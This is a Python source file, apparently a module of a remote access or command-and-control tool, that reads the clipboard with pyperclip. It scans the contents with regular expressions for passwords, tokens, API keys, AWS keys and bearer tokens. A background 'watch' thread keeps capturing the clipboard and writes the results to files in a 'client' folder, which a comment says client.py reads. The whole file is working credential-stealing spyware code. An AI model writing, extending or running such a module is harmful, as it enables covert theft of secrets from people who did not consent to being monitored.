"""Clipboard monitoring module — captures clipboard contents and searches for
credentials, tokens, or sensitive patterns.

Usage:
    clipboard monitor       # Run a one-time clipboard read
    clipboard watch [secs]  # Continuously monitor at interval (default: 30s)
    clipboard stop          # Stop watch mode
    clipboard status        # Show watch status
"""

import os
import re
import time
import threading
from typing import Optional


_watch_thread: Optional[threading.Thread] = None
_watch_active = False


def run(args: list[str]) -> str:
    """Module entry point."""
    global _watch_thread, _watch_active

    if not args:
        return _read_clipboard()

    action = args[0].lower()

    if action == "monitor":
        return _read_clipboard()

    elif action == "watch":
        if _watch_active:
            return "Watch already running. Use 'clipboard stop' first."
        interval = int(args[1]) if len(args) > 1 and args[1].isdigit() else 30
        _start_watch(interval)
        return f"Clipboard watch started (interval: {interval}s)"

    elif action == "stop":
        _stop_watch()
        return "Clipboard watch stopped."

    elif action == "status":
        if _watch_active:
            return "Watch: running"
        return "Watch: stopped"

    return "Usage: clipboard [monitor|watch [secs]|stop|status]"


def _read_clipboard() -> str:
    """Read clipboard contents and search for sensitive patterns."""
    import pyperclip

    try:
        text = pyperclip.paste()
    except Exception as e:
        return f"Clipboard read failed: {e}"

    if not text:
        return "Clipboard is empty."

    lines = [f"Clipboard content ({len(text)} chars):"]
    lines.append(text[:2000])  # Cap output to avoid flooding

    # Search for credential-like patterns
    patterns = [
        (r"password[=\s:]+\S+", "PASSWORD"),
        (r"token[=\s:]+\S+", "TOKEN"),
        (r"api[_-]?key[=\s:]+\S+", "API KEY"),
        (r"secret[=\s:]+\S+", "SECRET"),
        (r"aws[_-]?access[_-]?key", "AWS KEY"),
        (r"private[_-]?key", "PRIVATE KEY"),
        (r"bearer\s+\S+", "BEARER TOKEN"),
    ]

    found = []
    for pattern, label in patterns:
        matches = re.findall(pattern, text, re.IGNORECASE)
        for m in matches:
            found.append(f"  [{label}] {m[:80]}")

    if found:
        lines.append("")
        lines.append("=== Sensitive data detected ===")
        lines.extend(found)

    return "\n".join(lines)


def _start_watch(interval: int):
    """Start background clipboard monitoring thread."""
    global _watch_thread, _watch_active

    def _watch_loop():
        global _watch_active
        while _watch_active:
            result = _read_clipboard()
            # Write result to a temp file that client.py can read
            tmp_path = os.path.join(
                os.path.dirname(__file__), "..", "client", ".clipboard_output"
            )
            with open(tmp_path, "w") as f:
                f.write(result)
            # Also store last output for status queries
            tmp_status = os.path.join(
                os.path.dirname(__file__), "..", "client", ".clipboard_status"
            )
            with open(tmp_status, "w") as f:
                lines = result.split("\n")
                f.write("\n".join(lines[:5]))
            time.sleep(interval)

    _watch_active = True
    _watch_thread = threading.Thread(target=_watch_loop, daemon=True)
    _watch_thread.start()


def _stop_watch():
    """Stop the watch thread."""
    global _watch_active
    _watch_active = False
